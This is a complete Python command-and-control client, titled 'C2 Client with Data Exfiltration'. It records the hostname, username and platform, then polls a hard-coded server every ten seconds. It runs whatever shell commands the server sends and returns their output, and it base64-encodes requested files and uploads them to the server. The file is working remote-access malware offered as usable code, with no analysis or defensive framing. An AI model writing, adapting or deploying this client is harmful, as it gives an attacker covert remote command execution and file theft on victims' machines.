# C2 Client with Data Exfiltration

import urllib.request
import urllib.error
import subprocess
import time
import json
import os
import platform
import socket
import getpass
from datetime import datetime
import hashlib
import base64

C2_SERVER = "http://192.168.1.9:8080"
CHECK_INTERVAL = 10

class C2Client:
    def __init__(self, server_url, interval=10):
        self.server_url = server_url
        self.interval = interval
        self.client_info = self._get_client_info()
        self.session_start = datetime.now()
        self.task_count = 0
    
    def _get_client_info(self):
        return {
            'hostname': socket.gethostname(),
            'username': getpass.getuser(),
            'platform': platform.system(),
            'platform_version': platform.version(),
            'python_version': platform.python_version(),
            'cwd': os.getcwd()
        }
    
    def _send_request(self, endpoint, data=None, method='GET', headers=None):
        try:
            url = f"{self.server_url}{endpoint}"
            
            if headers is None:
                headers = {}
            
            if data and method.upper() == 'POST':
                if isinstance(data, dict):
                    data = json.dumps(data).encode()
                    headers['Content-Type'] = 'application/json'
                req = urllib.request.Request(url, data=data, headers=headers, method='POST')
            else:
                req = urllib.request.Request(url, headers=headers, method=method)
            
            response = urllib.request.urlopen(req, timeout=30)
            return response.read().decode()
            
        except:
            return None
    
    def execute_command(self, command):
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                encoding='utf-8',
                errors='ignore',
                timeout=30
            )
            
            return {
                'command': command,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode,
                'cwd': os.getcwd()
            }
            
        except subprocess.TimeoutExpired:
            return {
                'command': command,
                'stdout': '',
                'stderr': 'Command timed out'
            }
        except Exception as e:
            return {
                'command': command,
                'stdout': '',
                'stderr': str(e)
            }
    
    def upload_file(self, filepath):
        try:
            filepath = filepath.strip('"\'')
            
            if not os.path.exists(filepath):
                return {'status': 'error', 'message': 'File not found'}
            
            file_size = os.path.getsize(filepath)
            if file_size > 50 * 1024 * 1024:
                return {'status': 'error', 'message': 'File too large'}
            
            with open(filepath, 'rb') as f:
                file_data = f.read()
            
            file_hash = hashlib.sha256(file_data).hexdigest()
            
            metadata = {
                'filename': os.path.basename(filepath),
                'filesize': file_size,
                'sha256': file_hash,
                'client_info': self.client_info
            }
            
            encoded_file = base64.b64encode(file_data).decode('utf-8')
            
            upload_data = {
                'filename': os.path.basename(filepath),
                'filedata': encoded_file,
                'metadata': metadata
            }
            
            response = self._send_request('/upload', data=upload_data, method='POST')
            
            if response:
                try:
                    return json.loads(response)
                except:
                    return {'status': 'success'}
            else:
                return {'status': 'error', 'message': 'No response'}
                
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    def handle_exfil_task(self, task):
        task_type = task.get('type', '')
        task_id = task.get('task_id', '')
        
        if task_type == 'exfil':
            filename = task.get('filename', '')
            action = task.get('action', 'upload')
            
            if action == 'upload':
                filename = filename.strip('"\'')
                
                if not os.path.exists(filename):
                    return {
                        'task_id': task_id,
                        'status': 'error',
                        'message': 'File not found'
                    }
                
                result = self.upload_file(filename)
                
                return {
                    'task_id': task_id,
                    'status': result.get('status', 'error'),
                    'files_exfiltrated': [os.path.basename(filename)] if result.get('status') == 'success' else []
                }
        
        return {
            'task_id': task_id,
            'status': 'error'
        }
    
    def check_for_tasks(self):
        try:
            response_data = self._send_request('/command')
            
            if response_data:
                try:
                    return json.loads(response_data)
                except:
                    if response_data.strip() and response_data.strip() != 'C2 Server Ready':
                        return {
                            'type': 'command',
                            'command': response_data.strip()
                        }
            
            return None
            
        except:
            return None
    
    def send_response(self, response_data):
        try:
            if isinstance(response_data, dict):
                return self._send_request('/', data=response_data, method='POST')
            else:
                return self._send_request('/', data=str(response_data).encode(), method='POST')
        except:
            return None
    
    def send_exfil_result(self, result_data):
        try:
            return self._send_request('/exfil_result', data=result_data, method='POST')
        except:
            return None
    
    def run(self):
        print(f"\nC2 Client - Connected to: {self.server_url}")
        print(f"Host: {self.client_info['hostname']}\\{self.client_info['username']}")
        print(f"Press Ctrl+C to stop\n")
        
        checkin_count = 0
        
        while True:
            try:
                timestamp = datetime.now().strftime("%H:%M:%S")
                
                task = self.check_for_tasks()
                checkin_count += 1
                
                if task:
                    task_type = task.get('type', '')
                    
                    if task_type == 'command':
                        command = task.get('command', '')
                        if command and command != 'NOOP':
                            result = self.execute_command(command)
                            self.send_response(result)
                    
                    elif task_type == 'exfil':
                        result = self.handle_exfil_task(task)
                        self.send_exfil_result(result)
                
                time.sleep(self.interval)
                
            except KeyboardInterrupt:
                print("\n[+] Client stopped")
                break
            except:
                time.sleep(self.interval * 2)

def main():
    print("C2 Client starting...")
    
    server_url = C2_SERVER
    interval = CHECK_INTERVAL
    
    client = C2Client(server_url, interval)
    client.run()

if __name__ == "__main__":
    main()